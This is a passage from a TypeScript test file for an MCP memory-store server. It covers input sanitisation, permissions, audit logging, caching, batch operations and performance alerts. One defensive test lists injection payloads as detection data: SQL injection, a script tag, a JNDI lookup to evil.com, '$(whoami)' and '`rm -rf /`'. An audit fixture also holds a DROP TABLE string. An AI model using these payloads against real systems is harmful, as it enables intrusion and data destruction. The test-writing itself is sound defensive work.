      expect(result.query).not.toContain("';");
      expect(result.query).not.toContain('--');
      expect(result.scope.project).not.toContain('<script>');
      expect(mockSecurityService.sanitizeParameters).toHaveBeenCalledWith(
        'memory_find',
        maliciousParams
      );
    });

    it('should detect and block injection attempts', async () => {
      const injectionAttempts = [
        "'; SELECT * FROM users; --",
        "<script>fetch('/api/steal-data')</script>",
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '$(whoami)',
        '`rm -rf /`',
      ];

      mockSecurityService.sanitizeParameters.mockImplementation(
        async (toolName: string, params: any) => {
          const paramString = JSON.stringify(params);
          const hasInjection = injectionAttempts.some((attempt) =>
            paramString.toLowerCase().includes(attempt.toLowerCase())
          );

          if (hasInjection) {
            throw new Error('Potential injection detected');
          }

          return params;
        }
      );

      await expect(
        mockSecurityService.sanitizeParameters('memory_find', {
          query: injectionAttempts[0],
        })
      ).rejects.toThrow('Potential injection detected');
    });
  });

  describe('Execution Permissions', () => {
    it('should check execution context permissions', async () => {
      const secureContext: ToolExecutionContext = {
        toolName: 'memory_store',
        parameters: validMemoryStoreItem,
        userId: 'authorized-user',
        sessionId: 'secure-session',
        timestamp: new Date().toISOString(),
        requestId: 'req-456',
      };

      mockSecurityService.validateExecutionContext.mockResolvedValue({
        valid: true,
        permissions: ['read', 'write'],
        restrictions: [],
        expiry: new Date(Date.now() + 3600000).toISOString(),
      });

      const validation = await mockSecurityService.validateExecutionContext(secureContext);

      expect(validation.valid).toBe(true);
      expect(validation.permissions).toContain('write');
      expect(validation.restrictions).toHaveLength(0);
    });

    it('should enforce resource usage limits', async () => {
      mockSecurityService.checkResourceLimits.mockImplementation(
        async (userId: string, operation: string) => {
          const userLimits = {
            'user-1': { storage: 1000000, queries: 1000, batchSize: 100 },
            'user-2': { storage: 100000, queries: 100, batchSize: 10 },
          };

          const limits = userLimits[userId as keyof typeof userLimits] || {
            storage: 10000,
            queries: 50,
            batchSize: 5,
          };

          // Simulate usage check
          const currentUsage = {
            storage: operation === 'store' ? 500000 : 0,
            queries: operation === 'find' ? 150 : 0,
          };

          return {
            allowed: currentUsage.storage < limits.storage && currentUsage.queries < limits.queries,
            limits,
            currentUsage,
            reason: currentUsage.storage >= limits.storage ? 'storage_exceeded' : null,
          };
        }
      );

      const user1Check = await mockSecurityService.checkResourceLimits('user-1', 'store');
      const user2Check = await mockSecurityService.checkResourceLimits('user-2', 'store');

      expect(user1Check.allowed).toBe(true);
      expect(user2Check.allowed).toBe(false); // Would exceed storage limit
      expect(user2Check.reason).toBe('storage_exceeded');
    });
  });

  describe('Audit Logging', () => {
    it('should log all tool executions for audit trail', async () => {
      const auditEvent = {
        toolName: 'memory_store',
        userId: executionContext.userId,
        sessionId: executionContext.sessionId,
        requestId: executionContext.requestId,
        parameters: validMemoryStoreItem,
        result: { success: true, stored: ['entity-123'] },
        executionTime: 145,
        timestamp: new Date().toISOString(),
        ipAddress: '192.168.1.100',
        userAgent: 'MCP-Client/1.0',
      };

      mockSecurityService.logSecurityEvent.mockResolvedValue(undefined);

      await mockSecurityService.logSecurityEvent({
        type: 'TOOL_EXECUTION',
        ...auditEvent,
      });

      expect(mockSecurityService.logSecurityEvent).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'TOOL_EXECUTION',
          toolName: 'memory_store',
          userId: executionContext.userId,
          timestamp: expect.any(String),
        })
      );
    });

    it('should log security events and violations', async () => {
      const securityViolations = [
        {
          type: 'UNAUTHORIZED_ACCESS',
          userId: 'suspicious-user',
          tool: 'memory_delete',
          reason: 'insufficient_permissions',
          severity: 'high',
          timestamp: new Date().toISOString(),
          context: {
            ipAddress: '10.0.0.50',
            attempts: 5,
            userAgent: 'Unknown-Client/0.1',
          },
        },
        {
          type: 'PARAMETER_INJECTION',
          userId: 'attacker',
          tool: 'memory_find',
          reason: 'sql_injection_attempt',
          severity: 'critical',
          timestamp: new Date().toISOString(),
          context: {
            maliciousParams: { query: "'; DROP TABLE entities; --" },
            blocked: true,
          },
        },
      ];

      for (const violation of securityViolations) {
        await mockSecurityService.logSecurityEvent(violation);
      }

      expect(mockSecurityService.logSecurityEvent).toHaveBeenCalledTimes(2);
      expect(mockSecurityService.logSecurityEvent).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'UNAUTHORIZED_ACCESS',
          severity: 'high',
        })
      );
      expect(mockSecurityService.logSecurityEvent).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'PARAMETER_INJECTION',
          severity: 'critical',
        })
      );
    });
  });
});

// ============================================================================
// Test Suite 6: Performance and Optimization
// ============================================================================

describe('Performance and Optimization', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Tool Execution Optimization', () => {
    it('should optimize execution paths based on query complexity', async () => {
      const simpleQuery = {
        query: 'user service',
        mode: 'fast' as const,
        top_k: 5,
      };

      const complexQuery = {
        query: 'authentication security performance database architecture decisions',
        mode: 'deep' as const,
        top_k: 50,
        filters: {
          dateRange: { start: '2024-01-01', end: '2024-12-31' },
          confidence: { min: 0.8 },
        },
      };

      mockPerformanceMonitor.analyzeQueryComplexity
        .mockResolvedValueOnce({ complexity: 'low', estimatedTime: 50, strategy: 'keyword' })
        .mockResolvedValueOnce({
          complexity: 'high',
          estimatedTime: 500,
          strategy: 'semantic_parallel',
        });

      mockMemoryStore.find
        .mockResolvedValueOnce({
          results: [mockKnowledgeItems[0]],
          total: 1,
          searchTime: 45,
          metadata: { optimization: 'keyword_index' },
        })
        .mockResolvedValueOnce({
          results: mockKnowledgeItems,
          total: 2,
          searchTime: 420,
          metadata: {
            optimization: 'vector_search_with_filters',
            parallelExecution: true,
            cacheHit: false,
          },
        });

      const simpleAnalysis = await mockPerformanceMonitor.analyzeQueryComplexity(simpleQuery);
      const complexAnalysis = await mockPerformanceMonitor.analyzeQueryComplexity(complexQuery);

      expect(simpleAnalysis.complexity).toBe('low');
      expect(simpleAnalysis.estimatedTime).toBeLessThan(100);

      expect(complexAnalysis.complexity).toBe('high');
      expect(complexAnalysis.strategy).toBe('semantic_parallel');
    });

    it('should implement intelligent query routing', async () => {
      const queries = [
        { query: 'specific entity name', expectedRoute: 'exact_match' },
        { query: 'user authentication flow', expectedRoute: 'semantic_search' },
        { query: 'tag:security type:decision', expectedRoute: 'filtered_search' },
        { query: 'recent issues high priority', expectedRoute: 'temporal_search' },
      ];

      mockPerformanceMonitor.routeQuery.mockImplementation(async (query: any) => {
        if (query.query.includes('specific entity'))
          return { route: 'exact_match', confidence: 0.95 };
        if (query.query.includes('authentication'))
          return { route: 'semantic_search', confidence: 0.87 };
        if (query.query.includes('tag:')) return { route: 'filtered_search', confidence: 0.92 };
        if (query.query.includes('recent')) return { route: 'temporal_search', confidence: 0.78 };
        return { route: 'default', confidence: 0.5 };
      });

      for (const { query, expectedRoute } of queries) {
        const routing = await mockPerformanceMonitor.routeQuery({ query });
        expect(routing.route).toBe(expectedRoute);
        expect(routing.confidence).toBeGreaterThan(0.7);
      }
    });
  });

  describe('Caching Strategies', () => {
    it('should implement multi-level caching', async () => {
      const cacheKey = 'memory_find:auth-service:entities:main';
      const cachedResults = {
        results: [mockKnowledgeItems[0]],
        total: 1,
        searchTime: 5,
        metadata: { cache: 'L1_hit', age: 30 },
      };

      mockPerformanceMonitor.checkCache
        .mockResolvedValueOnce(null) // L1 miss
        .mockResolvedValueOnce(cachedResults) // L2 hit
        .mockResolvedValueOnce(cachedResults); // L1 hit (after repopulation)

      // First call - L1 miss, L2 hit
      const l1Result = await mockPerformanceMonitor.checkCache(cacheKey, 'L1');
      expect(l1Result).toBeNull();

      const l2Result = await mockPerformanceMonitor.checkCache(cacheKey, 'L2');
      expect(l2Result).toEqual(cachedResults);
      expect(l2Result.metadata['cache']).toBe('L1_hit');

      // Second call - L1 hit
      const l1HitResult = await mockPerformanceMonitor.checkCache(cacheKey, 'L1');
      expect(l1HitResult).toEqual(cachedResults);

      expect(mockPerformanceMonitor.checkCache).toHaveBeenCalledTimes(3);
    });

    it('should implement cache warming strategies', async () => {
      const warmupQueries = [
        { query: 'authentication', types: ['entity'] },
        { query: 'database decisions', types: ['decision'] },
        { query: 'performance issues', types: ['issue', 'observation'] },
      ];

      mockPerformanceMonitor.warmupCache.mockImplementation(async (queries: any[]) => {
        const results = [];
        for (const query of queries) {
          // Simulate cache warming
          await new Promise((resolve) => setTimeout(resolve, 10));
          results.push({
            query,
            cacheKey: `warmup:${query.query}:${query.types?.join(',')}`,
            warmed: true,
            estimatedHitRate: 0.8,
          });
        }
        return results;
      });

      const warmupResults = await mockPerformanceMonitor.warmupCache(warmupQueries);

      expect(warmupResults).toHaveLength(3);
      expect(warmupResults[0].warmed).toBe(true);
      expect(warmupResults[0].estimatedHitRate).toBe(0.8);
      expect(mockPerformanceMonitor.warmupCache).toHaveBeenCalledWith(warmupQueries);
    });

    it('should implement cache invalidation policies', async () => {
      const invalidationScenarios = [
        {
          trigger: 'knowledge_update',
          item: { id: 'entity-123', kind: 'entity' },
          invalidationKeys: ['entity:123', 'project:test:entities', 'search:entity:*'],
        },
        {
          trigger: 'schema_change',
          item: { type: 'field_addition', field: 'priority' },
          invalidationKeys: ['schema:*', 'search:*', 'filters:*'],
        },
        {
          trigger: 'bulk_import',
          item: { count: 1000, project: 'migration-project' },
          invalidationKeys: ['project:migration-project:*', 'search:*', 'cache:stats'],
        },
      ];

      mockPerformanceMonitor.invalidateCache.mockImplementation(
        async (trigger: string, item: any, keys: string[]) => {
          return {
            trigger,
            keysInvalidated: keys.length,
            cacheCleared: keys.length > 50, // Bulk invalidation
            duration: Math.random() * 100 + 10,
          };
        }
      );

      for (const scenario of invalidationScenarios) {
        const result = await mockPerformanceMonitor.invalidateCache(
          scenario.trigger,
          scenario.item,
          scenario.invalidationKeys
        );

        expect(result.trigger).toBe(scenario.trigger);
        expect(result.keysInvalidated).toBe(scenario.invalidationKeys.length);
      }
    });
  });

  describe('Batch Operation Support', () => {
    it('should handle batch store operations efficiently', async () => {
      const batchItems = Array.from({ length: 50 }, (_, i) => ({
        ...validMemoryStoreItem,
        data: {
          ...validMemoryStoreItem.data,
          title: `Entity ${i + 1}`,
          batchId: 'batch-001',
        },
      }));

      const batchResult: MemoryStoreResponse = {
        success: true,
        stored: batchItems.map((_, i) => `entity-${i + 1}`),
        duplicates: [],
        errors: [],
        metadata: {
          batchOperation: {
            batchSize: 50,
            processingTime: 1250,
            throughput: 40, // items per second
            parallelization: true,
            workerCount: 4,
          },
        },
      };

      mockMemoryStore.store.mockResolvedValue(batchResult);

      const result = await mockMemoryStore.store({ items: batchItems });

      expect(result.success).toBe(true);
      expect(result.stored).toHaveLength(50);
      expect(result.metadata?.batchOperation?.throughput).toBe(40);
      expect(result.metadata?.batchOperation?.parallelization).toBe(true);
    });

    it('should handle batch find operations with pagination', async () => {
      const batchFindParams = {
        queries: [
          { query: 'user service', types: ['entity'] },
          { query: 'auth decisions', types: ['decision'] },
          { query: 'performance issues', types: ['issue'] },
        ],
        pagination: {
          pageSize: 20,
          currentPage: 1,
          sortBy: 'relevance',
          sortOrder: 'desc',
        },
      };

      const batchFindResults = {
        results: {
          'user service': {
            items: [mockKnowledgeItems[0]],
            total: 1,
            page: 1,
            totalPages: 1,
          },
          'auth decisions': {
            items: [mockKnowledgeItems[1]],
            total: 1,
            page: 1,
            totalPages: 1,
          },
          'performance issues': {
            items: [],
            total: 0,
            page: 1,
            totalPages: 0,
          },
        },
        metadata: {
          batchExecution: {
            queryCount: 3,
            totalItems: 2,
            executionTime: 180,
            parallelExecution: true,
            cacheHits: 1,
          },
        },
      };

      mockMemoryStore.batchFind.mockResolvedValue(batchFindResults);

      const result = await mockMemoryStore.batchFind(batchFindParams);

      expect(result.results).toBeDefined();
      expect(Object.keys(result.results)).toHaveLength(3);
      expect(result.metadata['batchExecution'].queryCount).toBe(3);
      expect(result.metadata['batchExecution'].cacheHits).toBe(1);
    });
  });

  describe('Resource Usage Monitoring', () => {
    it('should monitor and report resource usage', async () => {
      const resourceMetrics = {
        cpu: {
          usage: 45.2,
          cores: 8,
          loadAverage: [2.1, 2.3, 2.0],
        },
        memory: {
          used: 2048576000, // 2GB
          total: 8589934592, // 8GB
          percentage: 23.8,
          heapUsed: 512000000, // 512MB
          heapTotal: 1073741824, // 1GB
        },
        disk: {
          readOps: 150,
          writeOps: 75,
          readBytes: 10485760, // 10MB
          writeBytes: 5242880, // 5MB
        },
        network: {
          requestsIn: 25,
          requestsOut: 18,
          bytesIn: 1048576, // 1MB
          bytesOut: 524288, // 512KB
        },
      };

      mockPerformanceMonitor.getResourceMetrics.mockResolvedValue(resourceMetrics);

      const metrics = await mockPerformanceMonitor.getResourceMetrics();

      expect(metrics.cpu.usage).toBe(45.2);
      expect(metrics.memory.percentage).toBe(23.8);
      expect(metrics.disk.readOps).toBe(150);
      expect(metrics.network.requestsIn).toBe(25);
    });

    it('should implement performance alerts and thresholds', async () => {
      const thresholds = {
        cpu: { warning: 70, critical: 90 },
        memory: { warning: 80, critical: 95 },
        responseTime: { warning: 1000, critical: 3000 },
        errorRate: { warning: 0.05, critical: 0.1 },
      };

      const currentMetrics = {
        cpu: 85.3,
        memory: 92.1,
        responseTime: 2500,
        errorRate: 0.08,
      };

      mockPerformanceMonitor.checkThresholds.mockImplementation(
        async (metrics: any, thresholdConfig: any) => {
          const alerts = [];

          if (metrics.cpu > thresholdConfig.cpu.critical) {
            alerts.push({
              type: 'critical',
              metric: 'cpu',
              value: metrics.cpu,
              threshold: thresholdConfig.cpu.critical,
            });
          } else if (metrics.cpu > thresholdConfig.cpu.warning) {
            alerts.push({
              type: 'warning',
              metric: 'cpu',
              value: metrics.cpu,
              threshold: thresholdConfig.cpu.warning,
            });
          }

          if (metrics.memory > thresholdConfig.memory.critical) {
            alerts.push({
              type: 'critical',
              metric: 'memory',
              value: metrics.memory,
              threshold: thresholdConfig.memory.critical,
            });
          } else if (metrics.memory > thresholdConfig.memory.warning) {
            alerts.push({
              type: 'warning',
              metric: 'memory',
              value: metrics.memory,
              threshold: thresholdConfig.memory.warning,
            });
          }

          return {
            alerts,
            status: alerts.some((a) => a.type === 'critical')
              ? 'critical'
              : alerts.some((a) => a.type === 'warning')
                ? 'warning'
                : 'healthy',
            timestamp: new Date().toISOString(),
          };
        }
      );

      const alertResult = await mockPerformanceMonitor.checkThresholds(currentMetrics, thresholds);

      expect(alertResult.status).toBe('critical');
      expect(alertResult.alerts).toHaveLength(2);
      expect(alertResult.alerts.some((a) => a.metric === 'cpu' && a.type === 'warning')).toBe(true);
      expect(alertResult.alerts.some((a) => a.metric === 'memory' && a.type === 'critical')).toBe(
        true
      );
    });
  });
});
